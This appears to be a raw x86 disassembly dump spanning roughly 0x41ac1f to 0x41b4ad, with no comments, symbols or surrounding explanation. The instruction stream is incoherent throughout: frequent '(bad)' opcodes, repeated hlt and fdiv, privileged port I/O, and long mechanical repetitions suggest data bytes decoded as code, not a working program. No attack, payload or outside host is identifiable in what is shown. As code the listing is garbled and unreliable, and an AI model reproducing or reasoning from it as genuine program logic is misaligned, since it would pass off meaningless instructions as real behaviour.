  41ac1f:	sahf   
	...
  41ac34:	sub    al,0xd9
  41ac36:	hlt    
  41ac37:	sbb    BYTE PTR [edi],bh
  41ac39:	fxtract 
  41ac3b:	lds    ebp,FWORD PTR [eax]
  41ac3d:	fxtract 
  41ac3f:	sbb    ch,BYTE PTR [ebx]
  41ac41:	fxtract 
  41ac43:	test   BYTE PTR [ecx+ebx*8],al
  41ac46:	hlt    
  41ac47:	call   0xc13684f0
  41ac4c:	mov    al,ds:0x92cbf4d8
  41ac51:	fdiv   st,st(4)
  41ac53:	or     BYTE PTR [edi-0x28],bh
  41ac56:	hlt    
  41ac57:	push   ecx
  41ac58:	outs   dx,DWORD PTR ds:[esi]
  41ac59:	fdiv   st,st(4)
  41ac5b:	lds    ebx,FWORD PTR [ecx-0x67f10b28]
  41ac61:	fdiv   st,st(4)
  41ac63:	mov    WORD PTR [eax-0x37040b28],ds
  41ac69:	fdiv   st,st(4)
  41ac6b:	jns    0x41acc8
  41ac6d:	fdiv   st,st(4)
  41ac6f:	neg    DWORD PTR [ebx-0x28]
  41ac72:	hlt    
  41ac73:	jae    0x41ac0c
  41ac75:	fdiv   st,st(4)
  41ac77:	loope  0x41ac10
  41ac79:	fdiv   st,st(4)
  41ac7b:	adc    al,BYTE PTR [esi-0x79070b28]
  41ac81:	fdiv   st,st(4)
  41ac83:	sub    DWORD PTR [ecx-0x2c3a0b28],edx
  41ac89:	xlat   BYTE PTR ds:[ebx]
  41ac8a:	hlt    
  41ac8b:	sti    
  41ac8c:	rcl    edi,cl
  41ac8e:	hlt    
  41ac8f:	xor    DWORD PTR [edx+edx*8-0x2bc60038],ecx
  41ac96:	enter  0xff,0x0
	...
  41acaa:	add    BYTE PTR [eax],al
  41acac:	in     al,0xe9
  41acae:	enter  0xf9ff,0xd3
  41acb2:	enter  0x26ff,0x0
  41acb6:	leave  
  41acb7:	call   DWORD PTR [ebp+0xb]
  41acba:	leave  
  41acbb:	jmp    DWORD PTR [ebx-0x73fff753]
  41acc1:	lods   eax,DWORD PTR ds:[esi]
  41acc2:	or     BYTE PTR [eax],al
  41acc4:	mov    WORD PTR [ebp-0x5273fff8],gs
  41acca:	or     BYTE PTR [eax],al
  41accc:	mov    WORD PTR [ebp-0x6e30fff8],gs
  41acd2:	loope  0x41ad36
  41acd4:	loop   0x41ac97
  41acd6:	sub    BYTE PTR [eax-0x13],cl
  41acd9:	mov    esi,0x1beffe0
  41acde:	retf   0xc153
  41ace1:	(bad)  
  41ace2:	and    eax,0xc3fdc147
  41ace7:	push   ecx
  41ace8:	loopne 0x41acaa
  41acea:	ret    
  41aceb:	dec    eax
  41acec:	mov    WORD PTR [eax-0x2a4ed220],ss
  41acf2:	in     eax,dx
  41acf3:	jmp    FWORD PTR [eax-0x43]
  41acf6:	push   ss
  41acf7:	pop    eax
  41acf8:	mov    WORD PTR [ecx],cs
  41acfa:	xlat   BYTE PTR ds:[ebx]
  41acfb:	jb     0x41aca6
  41acfd:	lods   eax,DWORD PTR ds:[esi]
  41acfe:	mov    bh,0x67
  41ad00:	mov    cl,0x11
  41ad02:	in     eax,0x42
  41ad04:	xchg   esp,eax
  41ad05:	adc    al,ch
  41ad07:	jb     0x41ac89
  41ad09:	sbb    dl,cl
  41ad0b:	jmp    FWORD PTR [edi+ecx*1-0x18]
  41ad0f:	arpl   WORD PTR [eax],ax
	...
  41ad21:	add    BYTE PTR [eax],al
  41ad23:	add    BYTE PTR [edx-0x738c15f1],ch
  41ad29:	mov    ah,0x1
  41ad2b:	or     edx,DWORD PTR [esi-0x53f90120]
  41ad31:	xchg   esp,eax
  41ad32:	sub    ebp,ebp
  41ad34:	gs das 
  41ad36:	dec    DWORD PTR [eax]
  41ad38:	xchg   BYTE PTR [ebx+eax*2-0x1f],dh
  41ad3c:	aaa    
  41ad3d:	je     0x41ad27
  41ad3f:	and    BYTE PTR [ebx+0x74],dh
  41ad42:	dec    DWORD PTR [eax]
  41ad44:	xchg   BYTE PTR [ebp-0x726c1da8],cl
  41ad4a:	call   0x487ddc72
  41ad4f:	xlat   BYTE PTR ds:[ebx]
  41ad50:	pop    ds
  41ad51:	je     0x41ad4b
  41ad53:	and    ebp,DWORD PTR [esp+esi*2-0x34]
  41ad57:	adc    al,0x6c
  41ad59:	je     0x41ad43
  41ad5b:	and    ebp,DWORD PTR [ecx+edi*1+0x74f0cff6]
  41ad62:	clc    
  41ad63:	or     BYTE PTR [ebx+ebp*1-0x717910e7],ch
  41ad6a:	mov    edi,0xbf30eedf
  41ad6f:	or     al,0xac
  41ad71:	je     0x41ad77
  41ad73:	adc    al,0xac
  41ad75:	xchg   esp,eax
  41ad76:	jmp    DWORD PTR [ebx]
  41ad78:	lods   al,BYTE PTR ds:[esi]
  41ad79:	je     0x41ad7c
  41ad7b:	and    DWORD PTR [ebp+0x6c23ff76],edi
  41ad81:	xchg   esp,eax
  41ad82:	mov    dl,0xeb
  41ad84:	scas   al,BYTE PTR es:[edi]
  41ad85:	xor    bl,al
  41ad87:	push   ss
	...
  41ad9c:	jle    0x41ae10
  41ad9e:	ret    
  41ad9f:	out    0xb7,eax
  41ada1:	xchg   esp,eax
  41ada2:	fild   WORD PTR [ebx]
  41ada4:	mov    WORD PTR [edi+ebx*8-0x206b73fd],ss
  41adab:	add    ecx,DWORD PTR [esp+edx*4-0x6b73fc21]
  41adb2:	fild   WORD PTR [ebx]
  41adb4:	mov    WORD PTR [edi+ebx*8-0x206b73fd],ss
  41adbb:	add    ecx,DWORD PTR [esp+edx*4-0x6b7016f8]
  41adc2:	or     cl,ch
  41adc4:	(bad)  
  41adc5:	xchg   esp,eax
  41adc6:	or     cl,ch
  41adc8:	(bad)  
  41adc9:	xchg   esp,eax
  41adca:	or     cl,ch
  41adcc:	(bad)  
  41adcd:	xchg   esp,eax
  41adce:	or     cl,ch
  41add0:	(bad)  
  41add1:	xchg   esp,eax
  41add2:	or     cl,ch
  41add4:	(bad)  
  41add5:	xchg   esp,eax
  41add6:	or     cl,ch
  41add8:	(bad)  
  41add9:	xchg   esp,eax
  41adda:	or     cl,ch
  41addc:	(bad)  
  41addd:	xchg   esp,eax
  41adde:	or     cl,ch
  41ade0:	(bad)  
  41ade1:	xchg   esp,eax
  41ade2:	or     cl,ch
  41ade4:	(bad)  
  41ade5:	xchg   esp,eax
  41ade6:	or     cl,ch
  41ade8:	(bad)  
  41ade9:	xchg   esp,eax
  41adea:	or     cl,ch
  41adec:	(bad)  
  41aded:	xchg   esp,eax
  41adee:	or     cl,ch
  41adf0:	(bad)  
  41adf1:	xchg   esp,eax
  41adf2:	or     cl,ch
  41adf4:	(bad)  
  41adf5:	xchg   esp,eax
  41adf6:	or     cl,ch
  41adf8:	(bad)  
  41adf9:	xchg   esp,eax
  41adfa:	or     cl,ch
  41adfc:	(bad)  
  41adfd:	xchg   esp,eax
  41adfe:	or     cl,ch
	...
  41ae14:	(bad)  
  41ae15:	xchg   esp,eax
  41ae16:	or     cl,ch
  41ae18:	(bad)  
  41ae19:	xchg   esp,eax
  41ae1a:	or     cl,ch
  41ae1c:	(bad)  
  41ae1d:	xchg   esp,eax
  41ae1e:	or     cl,ch
  41ae20:	(bad)  
  41ae21:	xchg   esp,eax
  41ae22:	or     cl,ch
  41ae24:	(bad)  
  41ae25:	xchg   esp,eax
  41ae26:	or     cl,ch
  41ae28:	(bad)  
  41ae29:	xchg   esp,eax
  41ae2a:	or     cl,ch
  41ae2c:	(bad)  
  41ae2d:	xchg   esp,eax
  41ae2e:	or     cl,ch
  41ae30:	(bad)  
  41ae31:	xchg   esp,eax
  41ae32:	or     cl,ch
  41ae34:	(bad)  
  41ae35:	xchg   esp,eax
  41ae36:	or     cl,ch
  41ae38:	(bad)  
  41ae39:	xchg   esp,eax
  41ae3a:	or     cl,ch
  41ae3c:	(bad)  
  41ae3d:	xchg   esp,eax
  41ae3e:	or     cl,ch
  41ae40:	(bad)  
  41ae41:	xchg   esp,eax
  41ae42:	or     cl,ch
  41ae44:	(bad)  
  41ae45:	xchg   esp,eax
  41ae46:	or     cl,ch
  41ae48:	(bad)  
  41ae49:	xchg   esp,eax
  41ae4a:	or     BYTE PTR [eax],al
  41ae4c:	in     eax,0x94
  41ae4e:	or     BYTE PTR [eax],al
  41ae50:	in     eax,0x94
  41ae52:	or     BYTE PTR [eax],al
  41ae54:	cmc    
  41ae55:	xchg   esp,eax
  41ae56:	or     BYTE PTR [eax],al
  41ae58:	cmc    
  41ae59:	xchg   esp,eax
  41ae5a:	or     BYTE PTR [eax],al
  41ae5c:	in     eax,0x94
  41ae5e:	or     BYTE PTR [eax],al
  41ae60:	in     eax,0x94
  41ae62:	or     BYTE PTR [eax],al
  41ae64:	mov    ch,0x94
  41ae66:	or     BYTE PTR [eax],al
  41ae68:	mov    ch,0x94
  41ae6a:	or     BYTE PTR [eax],al
  41ae6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae6d:	xchg   esp,eax
  41ae6e:	or     BYTE PTR [eax],al
  41ae70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae71:	xchg   esp,eax
  41ae72:	or     BYTE PTR [eax],al
  41ae74:	mov    ch,0x94
  41ae76:	or     BYTE PTR [eax],al
	...
  41ae8c:	mov    ch,0x94
  41ae8e:	or     BYTE PTR [eax],al
  41ae90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae91:	xchg   esp,eax
  41ae92:	or     BYTE PTR [eax],al
  41ae94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae95:	xchg   esp,eax
  41ae96:	or     BYTE PTR [eax],al
  41ae98:	jne    0x41ae2e
  41ae9a:	or     BYTE PTR [eax],al
  41ae9c:	jne    0x41ae32
  41ae9e:	or     BYTE PTR [eax],al
  41aea0:	gs xchg esp,eax
  41aea2:	or     BYTE PTR [eax],al
  41aea4:	gs xchg esp,eax
  41aea6:	or     BYTE PTR [eax],al
  41aea8:	jne    0x41ae3e
  41aeaa:	or     BYTE PTR [eax],al
  41aeac:	jne    0x41ae42
  41aeae:	or     BYTE PTR [eax],al
  41aeb0:	gs xchg esp,eax
  41aeb2:	or     BYTE PTR [eax],al
  41aeb4:	gs xchg esp,eax
  41aeb6:	or     BYTE PTR [eax],al
  41aeb8:	xor    eax,0x35000894
  41aebd:	xchg   esp,eax
  41aebe:	or     BYTE PTR [eax],al
  41aec0:	and    eax,0x25000894
  41aec5:	xchg   esp,eax
  41aec6:	or     BYTE PTR [eax],al
  41aec8:	xor    eax,0x35000894
  41aecd:	xchg   esp,eax
  41aece:	or     BYTE PTR [eax],al
  41aed0:	and    eax,0x25000894
  41aed5:	xchg   esp,eax
  41aed6:	or     BYTE PTR [eax],al
  41aed8:	mov    WORD PTR [ebp-0x5273fff8],gs
  41aede:	or     BYTE PTR [eax],al
  41aee0:	mov    WORD PTR [ebp-0x5273fff8],gs
  41aee6:	or     BYTE PTR [eax],al
  41aee8:	mov    WORD PTR [ebp-0x5273fff8],gs
  41aeee:	or     BYTE PTR [eax],al
	...
  41af04:	mov    WORD PTR [ebp-0x5273fff8],gs
  41af0a:	or     BYTE PTR [eax],al
  41af0c:	mov    WORD PTR [ebp-0x5273fff8],gs
  41af12:	or     BYTE PTR [eax],al
  41af14:	mov    WORD PTR [ebp-0x5273fff8],gs
  41af1a:	or     BYTE PTR [eax],al
  41af1c:	mov    WORD PTR [ebp-0x5273fff8],gs
  41af22:	or     BYTE PTR [eax],al
  41af24:	mov    WORD PTR [ebp-0x5273fff8],gs
  41af2a:	or     BYTE PTR [eax],al
  41af2c:	mov    WORD PTR [ebp-0x5273fff8],gs
  41af32:	or     BYTE PTR [eax],al
  41af34:	mov    WORD PTR [ebp-0x5273fff8],gs
  41af3a:	or     BYTE PTR [eax],al
  41af3c:	mov    WORD PTR [ebp-0x5273fff8],gs
  41af42:	or     BYTE PTR [eax],al
  41af44:	mov    WORD PTR [ebp-0x5273fff8],gs
  41af4a:	or     BYTE PTR [eax],al
  41af4c:	mov    WORD PTR [ebp-0x5273fff8],gs
  41af52:	or     BYTE PTR [eax],al
  41af54:	mov    WORD PTR [ebp-0x5273fff8],gs
  41af5a:	or     BYTE PTR [eax],al
  41af5c:	mov    WORD PTR [ebp-0x5373fff8],gs
  41af62:	sub    eax,DWORD PTR [ebx-0x4d]
  41af65:	xchg   esp,eax
  41af66:	js     0x41af14
	...
  41af7c:	inc    edi
  41af7d:	scas   eax,DWORD PTR es:[edi]
  41af7e:	adc    al,0x37
  41af80:	inc    esi
  41af81:	sbb    al,0x95
  41af83:	scas   eax,DWORD PTR es:[edi]
  41af84:	mov    ebp,0xc7ac68a4
  41af89:	scas   al,BYTE PTR es:[edi]
  41af8a:	fbld   TBYTE PTR [edi+ecx*2]
  41af8d:	aaa    
  41af8e:	pop    edi
  41af8f:	add    ecx,DWORD PTR [esp+edx*4-0x41]
  41af93:	add    edi,DWORD PTR [esp+edx*4-0x19]
  41af97:	add    edx,DWORD PTR [eax-0x2cfc1e6c]
  41af9d:	mov    esi,0x940c03de
  41afa2:	fild   WORD PTR [ebx]
  41afa4:	dec    esp
  41afa5:	xchg   esp,eax
  41afa6:	fild   WORD PTR [ebx]
  41afa8:	ins    BYTE PTR es:[edi],dx
  41afa9:	xchg   esp,eax
  41afaa:	fild   WORD PTR [ebx]
  41afac:	pushf  
  41afad:	xchg   esp,eax
  41afae:	fild   WORD PTR [ebx]
  41afb0:	xchg   esp,eax
  41afb1:	xchg   esp,eax
  41afb2:	fild   WORD PTR [ebx]
  41afb4:	mov    BYTE PTR [edi+ebx*8-0x206b71fd],dl
  41afbb:	add    edx,DWORD PTR [ebx-0x737c2142]
  41afc1:	xchg   esp,eax
  41afc2:	ffreep st(3)
  41afc4:	cmp    DWORD PTR [esi-0x6b73dc22],0xffffffdf
  41afcb:	repz jae 0x41af8c
  41afce:	fimul  WORD PTR [ebx]
  41afd0:	mov    WORD PTR [edi+ebx*8-0x21419c01],ss
  41afd7:	add    DWORD PTR [esp+edx*4-0x6b73fb21],ecx
  41afde:	pop    edi
  41afdf:	add    al,0x0
	...
  41aff1:	add    BYTE PTR [eax],al
  41aff3:	add    BYTE PTR [esp+edx*4-0x6b73fc61],cl
  41affa:	inc    DWORD PTR [ebx]
  41affc:	mov    WORD PTR [edi+ecx*8-0x86b73fd],ss
  41b003:	add    ecx,DWORD PTR [esp+edx*4-0x6b7012f8]
  41b00a:	or     bl,ch
  41b00c:	(bad)  
  41b00d:	xchg   esp,eax
  41b00e:	or     al,ch
  41b010:	(bad)  
  41b011:	xchg   esp,eax
  41b012:	or     cl,ah
  41b014:	lahf   
  41b015:	ins    BYTE PTR es:[edi],dx
  41b016:	sub    cl,dh
  41b018:	call   DWORD PTR [ebp+0x75a0d008]
  41b01e:	daa    
  41b01f:	loopne 0x41b019
  41b021:	xchg   esi,eax
  41b022:	pop    es
  41b023:	ret    
  41b024:	jge    0x41b090
  41b026:	sub    dl,bl
  41b028:	fisttp QWORD PTR [ebx+0x6b7eb20a]
  41b02e:	sub    DWORD PTR [edi],esp
  41b030:	sub    BYTE PTR [esi+0x2e],0xff
  41b034:	mov    ecx,0x9d140e8f
  41b039:	imul   ebp,DWORD PTR [ebx],0xb8abcec
  41b03f:	add    eax,0xdd2c709c
  41b044:	mov    ebx,0x9ed20c89
  41b049:	mov    WORD PTR [ecx],cs
  41b04b:	call   0xf15048dd
  41b050:	test   DWORD PTR [eax-0x5b7f11fa],edx
  41b056:	sbb    edi,esi
	...
  41b06c:	sbb    BYTE PTR [esp+edx*1+0x1d8b7fdc],0xe9
  41b074:	jae    0x41b009
  41b076:	adc    edi,ebp
  41b078:	mov    WORD PTR [eax-0x73a22101],gs
  41b07e:	or     eax,edx
  41b080:	pop    edx
  41b081:	nop
  41b082:	push   cs
  41b083:	add    ebx,DWORD PTR [edi-0x77]
  41b086:	pop    es
  41b087:	adc    DWORD PTR [edi-0x6df8d362],ebx
  41b08d:	cdq    
  41b08e:	sub    eax,0x2574641b
  41b093:	add    BYTE PTR [esi-0x6bc8d158],bl
  41b099:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b09a:	and    DWORD PTR [ecx],ebp
  41b09c:	and    al,0x72
  41b09e:	adc    al,0x1f
  41b0a0:	and    eax,0x2500f5bd
  41b0a5:	xchg   ecx,eax
  41b0a6:	or     BYTE PTR [eax],al
  41b0a8:	cmc    
  41b0a9:	nop
  41b0aa:	cmc    
  41b0ab:	push   ecx
  41b0ad:	mov    esp,0x90f100f5
  41b0b2:	cmc    
  41b0b3:	add    cl,ah
  41b0b5:	mov    esp,0x90f1fff5
  41b0ba:	or     BYTE PTR [eax],al
  41b0bc:	cmc    
  41b0bd:	nop
  41b0be:	cmc    
  41b0bf:	jmp    ebp
  41b0c1:	mov    esp,0xbce5fff4
  41b0c6:	cmc    
  41b0c7:	add    BYTE PTR [ecx-0x4aff0a44],dh
  41b0cd:	mov    esp,0xfff4
	...
  41b0e2:	add    BYTE PTR [eax],al
  41b0e4:	mov    cl,0xbc
  41b0e6:	hlt    
  41b0e7:	add    BYTE PTR [ecx-0x4aff0a70],ah
  41b0ed:	nop
  41b0ee:	or     BYTE PTR [ecx],al
  41b0f0:	mov    cl,0x90
  41b0f2:	or     BYTE PTR [eax],al
  41b0f4:	mov    cl,0xbc
  41b0f6:	hlt    
  41b0f7:	jmp    DWORD PTR [ebp+0x7500f4bc]
  41b0fd:	mov    esp,0xbc7500f4
  41b102:	cmc    
  41b103:	jmp    DWORD PTR [ebp-0x44]
  41b106:	cmc    
  41b107:	jmp    DWORD PTR [ebp-0x68]
  41b10a:	cmc    
  41b10b:	add    BYTE PTR [ebp-0x68],dh
  41b10e:	cmc    
  41b10f:	add    BYTE PTR [ecx-0x44],dh
  41b112:	hlt    
  41b113:	add    BYTE PTR [ecx-0x68],dh
  41b116:	cmc    
  41b117:	jmp    DWORD PTR [ecx-0x68]
  41b11a:	or     BYTE PTR [ecx],al
  41b11c:	xor    DWORD PTR [eax-0x5673fef8],ebx
  41b122:	or     bh,bh
  41b124:	cmp    ebp,DWORD PTR [esi-0x5673fff8]
  41b12a:	hlt    
  41b12b:	jmp    FWORD PTR [ebx]
  41b12d:	mov    dl,0xf4
  41b12f:	(bad)  
  41b130:	and    ebp,DWORD PTR [esi-0x5272fff8]
  41b136:	or     bh,bh
  41b138:	adc    ebp,DWORD PTR [edx-0x4e73010c]
  41b13e:	or     BYTE PTR [eax],al
  41b140:	mov    WORD PTR [ebp-0x527300f8],gs
  41b146:	hlt    
  41b147:	inc    BYTE PTR [eax]
	...
  41b159:	add    BYTE PTR [eax],al
  41b15b:	add    BYTE PTR [ebp+ebp*4-0x5272fff8],cl
  41b162:	or     BYTE PTR [eax],al
  41b164:	lea    ebp,[ebp-0x4e24000c]
  41b16a:	or     bh,bh
  41b16c:	mov    WORD PTR [ebp-0x523400f8],gs
  41b172:	hlt    
  41b173:	inc    bl
  41b175:	test   eax,0xad8d0008
  41b17a:	hlt    
  41b17b:	push   DWORD PTR [ebx-0x73fff757]
  41b181:	mov    cl,0xf4
  41b183:	dec    DWORD PTR [ecx+ebp*4-0x4e64010c]
  41b18a:	hlt    
  41b18b:	dec    BYTE PTR [ecx+ebp*4-0x527400f8]
  41b192:	or     bh,bh
  41b194:	mov    WORD PTR [ecx-0x4e73000c],gs
  41b19a:	or     BYTE PTR [eax],al
  41b19c:	lea    ebp,[ecx-0x4e94000c]
  41b1a2:	hlt    
  41b1a3:	(bad)  
  41b1a4:	arpl   WORD PTR [ebp-0x4e73010c],bp
  41b1aa:	hlt    
  41b1ab:	call   DWORD PTR [ebx-0x6c]
  41b1ae:	(bad)  
  41b1b0:	dec    ebx
  41b1b1:	xchg   esp,eax
  41b1b2:	(bad)  
  41b1b4:	inc    ebx
  41b1b5:	xchg   esp,eax
  41b1b6:	fild   WORD PTR [ebx]
  41b1b8:	mov    WORD PTR [ebx+ebp*8-0x2144ccfd],ss
  41b1bf:	inc    DWORD PTR [eax]
	...
  41b1d1:	add    BYTE PTR [eax],al
  41b1d3:	add    BYTE PTR [edx],ch
  41b1d5:	mov    ebx,0x948c03de
  41b1da:	jecxz  0x41b1df
  41b1dc:	sbb    edx,DWORD PTR [edi+edi*8-0x20eb837d]
  41b1e3:	or     DWORD PTR [esp+edx*1-0x6b737c21],0xffffffbf
  41b1eb:	sbb    DWORD PTR [esp+edx*4-0x6b63fc21],0xffffffbf
  41b1f3:	add    ecx,DWORD PTR [esp+edx*4+0x147c03bf]
  41b1fa:	mov    edi,0xbf148c83
  41b1ff:	add    ecx,DWORD PTR [esp+edx*1+0x149c83ff]
  41b206:	fild   WORD PTR [ebx+0x3df149c]
  41b20c:	mov    WORD PTR [edi+ebx*8],ss
  41b20f:	or     DWORD PTR [esp+edx*1-0x6b83fc21],0xffffffff
  41b217:	add    ecx,DWORD PTR [esp+edx*4+0x147c03ff]
  41b21e:	fild   WORD PTR [ebx+0x3bf947c]
  41b224:	pushf  
  41b225:	xchg   esp,eax
  41b226:	mov    edi,0xdf148c83
  41b22b:	add    ecx,DWORD PTR [esp+edx*4+0x148c03df]
  41b232:	fild   WORD PTR [ebx-0x7c406b74]
	...
  41b24c:	jl     0x41b1e2
  41b24e:	or     cl,ch
  41b250:	(bad)  
  41b251:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b252:	mov    cl,cl
  41b254:	(bad)  
  41b255:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b256:	or     BYTE PTR [ecx],cl
  41b258:	nop
  41b259:	xchg   esp,eax
  41b25a:	mov    cl,ch
  41b25c:	(bad)  
  41b25d:	xchg   esp,eax
  41b25e:	or     cl,ch
  41b260:	shld   DWORD PTR [eax],ecx,cl
  41b263:	or     DWORD PTR [eax],ecx
  41b265:	xchg   ebp,eax
  41b266:	or     cl,ch
  41b268:	shld   DWORD PTR [eax-0x775b7017],ecx,cl
  41b26f:	or     DWORD PTR [eax],edx
  41b271:	xchg   ebp,eax
  41b272:	or     cl,ch
  41b274:	(bad)  
  41b275:	xchg   esp,eax
  41b276:	or     cl,cl
  41b278:	shld   DWORD PTR [eax],ecx,cl
  41b27b:	leave  
  41b27c:	(bad)  
  41b27d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b27e:	mov    cl,ch
  41b280:	(bad)  
  41b281:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b282:	or     cl,cl
  41b284:	setne  BYTE PTR [eax-0x775b7017]
  41b28b:	jmp    0xe9ca579f
  41b290:	setne  BYTE PTR [eax]
  41b293:	jmp    0xe9ca5727
  41b298:	setne  BYTE PTR [eax+0x8948809]
  41b29f:	or     DWORD PTR [eax],edx
  41b2a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b2a2:	mov    BYTE PTR [ecx],cl
  41b2a4:	or     BYTE PTR [ebp-0x6b6ff6f8],ah
  41b2aa:	or     cl,ch
  41b2ac:	setne  BYTE PTR [eax]
  41b2af:	jmp    0x41b2b4
	...
  41b2c4:	(bad)  
  41b2c5:	xchg   esp,eax
  41b2c6:	mov    BYTE PTR [ecx],cl
  41b2c8:	or     BYTE PTR [ebp-0x5bf016f8],dl
  41b2ce:	mov    cl,ch
  41b2d0:	(bad)  
  41b2d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b2d2:	or     cl,cl
  41b2d4:	(bad)  
  41b2d5:	xchg   esp,eax
  41b2d6:	mov    cl,cl
  41b2d8:	(bad)  
  41b2d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b2da:	or     BYTE PTR [eax],al
  41b2dc:	push   ebp
  41b2dd:	adc    eax,0x95558008
  41b2e2:	or     BYTE PTR [eax+0x189545],al
  41b2e8:	gs adc eax,0x95350018
  41b2ee:	or     BYTE PTR [eax],al
  41b2f0:	xor    eax,0x85800815
  41b2f5:	adc    BYTE PTR [eax],cl
  41b2f7:	add    BYTE PTR ds:0x95800895,ah
  41b2fd:	nop
  41b2fe:	sbb    BYTE PTR [eax-0x7fe7ef6b],al
  41b304:	and    eax,0x2d001815
  41b309:	(bad)
  41b30d:	mov    cs,WORD PTR [edx]
  41b30f:	or     ch,dh
  41b311:	xchg   esp,eax
  41b312:	or     BYTE PTR [eax],al
  41b314:	in     eax,dx
  41b315:	xchg   esp,eax
  41b316:	or     cl,BYTE PTR [eax]
  41b318:	in     eax,0x8e
  41b31a:	or     BYTE PTR [eax],cl
  41b31c:	cmc    
  41b31d:	xchg   esp,eax
  41b31e:	or     BYTE PTR [eax],al
  41b320:	fisttp QWORD PTR [esi-0x711afff6]
  41b326:	or     BYTE PTR [eax],cl
	...
  41b33c:	in     eax,dx
  41b33d:	xchg   esp,eax
  41b33e:	or     al,BYTE PTR [eax]
  41b340:	mov    ebp,0xbd080894
  41b345:	xchg   esp,eax
  41b346:	or     BYTE PTR [eax],cl
  41b348:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b349:	xchg   esp,eax
  41b34a:	or     al,BYTE PTR [eax]
  41b34c:	lods   eax,DWORD PTR ds:[esi]
  41b34d:	mov    cs,WORD PTR [edx]
  41b34f:	or     BYTE PTR [ebp-0x4afff56c],bl
  41b355:	xchg   esp,eax
  41b356:	or     cl,BYTE PTR [eax]
  41b358:	lods   eax,DWORD PTR ds:[esi]
  41b359:	mov    cs,WORD PTR [eax]
  41b35b:	add    BYTE PTR [ebp+0x7d080894],ah
  41b361:	xchg   esp,eax
  41b362:	or     BYTE PTR [eax],al
  41b364:	jne    0x41b2f8
  41b366:	or     cl,BYTE PTR [eax]
  41b368:	mov    WORD PTR [ebp-0x5273fff6],gs
  41b36e:	or     al,BYTE PTR [edx]
  41b370:	mov    WORD PTR [ebp-0x3a6bfdf8],gs
  41b376:	or     BYTE PTR [edx],al
  41b378:	test   BYTE PTR [ebp-0x4a73fdf6],dh
  41b37e:	or     al,BYTE PTR [eax]
  41b380:	xchg   esp,eax
  41b381:	lods   eax,DWORD PTR ds:[esi]
  41b382:	or     al,BYTE PTR [edx]
  41b384:	mov    WORD PTR [ebp-0x4a73fdf8],gs
  41b38a:	or     al,BYTE PTR [eax]
  41b38c:	test   BYTE PTR [ebp-0x3a73fff8],dh
  41b392:	or     al,BYTE PTR [edx]
  41b394:	xchg   esp,eax
  41b395:	lods   eax,DWORD PTR ds:[esi]
  41b396:	or     al,BYTE PTR [eax]
  41b398:	mov    WORD PTR [ebp-0x527bfff8],gs
  41b39e:	or     al,BYTE PTR [edx]
	...
  41b3b4:	xchg   esp,eax
  41b3b5:	lods   eax,DWORD PTR ds:[esi]
  41b3b6:	or     BYTE PTR [eax],al
  41b3b8:	xchg   esp,eax
  41b3b9:	lds    ecx,FWORD PTR [eax]
  41b3bb:	add    cl,BYTE PTR [ebp+esi*4-0x5273fff6]
  41b3c2:	or     BYTE PTR [edx],al
  41b3c4:	mov    WORD PTR [ebp-0x526bfdf6],gs
  41b3ca:	or     al,BYTE PTR [eax]
  41b3cc:	test   BYTE PTR [ebp-0x5273fff8],ch
  41b3d2:	or     al,BYTE PTR [eax]
  41b3d4:	mov    ebp,es
  41b3d6:	or     BYTE PTR [edx],al
  41b3d8:	mov    ebp,es
  41b3da:	or     al,BYTE PTR [edx]
  41b3dc:	test   BYTE PTR [ebp-0x4a7bfff6],ch
  41b3e2:	or     BYTE PTR [eax],al
  41b3e4:	xchg   esp,eax
  41b3e5:	lods   eax,DWORD PTR ds:[esi]
  41b3e6:	or     al,BYTE PTR [eax]
  41b3e8:	mov    WORD PTR [ebp-0x4a73fff8],gs
  41b3ee:	or     BYTE PTR [edx],al
  41b3f0:	test   BYTE PTR [ebp-0x6b6bfff6],dh
  41b3f6:	fild   WORD PTR [ebx]
  41b3f8:	mov    ss,WORD PTR [edi+ebx*8-0x187373fd]
  41b3ff:	add    eax,0x3e78c8e
  41b404:	mov    WORD PTR [edi+esi*8-0x206b71fb],ss
  41b40b:	add    eax,0x3e7948e
  41b410:	mov    WORD PTR [edi+ebx*8-0x87371fd],cs
  41b417:	add    eax,0x0
	...
  41b42c:	mov    WORD PTR [edi+esi*8-0x206b73fb],cs
  41b433:	add    ecx,DWORD PTR [esi-0x71fa1874]
  41b439:	xchg   esp,eax
  41b43a:	test   DWORD PTR [ebx],0x3f7948c
  41b440:	mov    cs,WORD PTR [edi+ebx*8-0x1f6b71fb]
  41b447:	and    ecx,DWORD PTR [esp+edx*4]
  41b44a:	pusha  
  41b44b:	and    ecx,DWORD PTR [esp+edx*4-0x6b73dca0]
  41b452:	pop    edi
  41b453:	add    ecx,DWORD PTR [esp+edx*4-0x6bf3dca1]
  41b45a:	pusha  
  41b45b:	add    ecx,DWORD PTR [esp+edx*4]
  41b45e:	loopne 0x41b463
  41b460:	or     al,0x94
  41b462:	loopne 0x41b487
  41b464:	mov    WORD PTR [edi+ebx*8-0x206b73fd],ss
  41b46b:	and    ecx,DWORD PTR [esp+edx*4]
  41b46e:	fbld   TBYTE PTR [ebx]
  41b470:	or     al,0x94
  41b472:	pusha  
  41b473:	and    al,0xc
  41b475:	xchg   esp,eax
  41b476:	pusha  
  41b477:	add    al,0x8c
  41b479:	xchg   esp,eax
  41b47a:	fild   WORD PTR [ebx]
  41b47c:	mov    WORD PTR [edi+ebx*2+0x8940c04],ss
  41b483:	call   0xe849c917
  41b488:	(bad)  
  41b489:	xchg   esp,eax
  41b48a:	or     cl,ch
  41b48c:	scas   eax,DWORD PTR es:[edi]
  41b48d:	xchg   esp,eax
  41b48e:	or     cl,ch
	...
  41b4a4:	(bad)  
  41b4a5:	adc    al,0x8
  41b4a7:	call   0x6949c95b
  41b4ac:	nop
  41b4ad:	xchg   esp,eax
